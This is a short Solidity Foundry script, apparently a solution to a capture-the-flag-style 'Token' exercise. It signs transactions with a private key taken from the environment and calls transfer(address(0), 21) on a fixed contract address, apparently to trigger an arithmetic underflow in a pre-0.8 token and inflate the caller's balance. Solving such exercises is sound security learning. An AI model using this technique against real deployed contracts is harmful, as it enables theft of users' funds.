pragma solidity ^0.6.0;

import "../src/Token.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract TokenSolution is Script {

    Token public tokenInstance = Token(0xC2D4576Ad8b9D1a7f5c353037286bEF02af3689C);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        //new MoreToken(tokenInstance, vm.envAddress("ADDRESS"));

        tokenInstance.transfer(address(0), 21);

        
        vm.stopBroadcast();
    }
}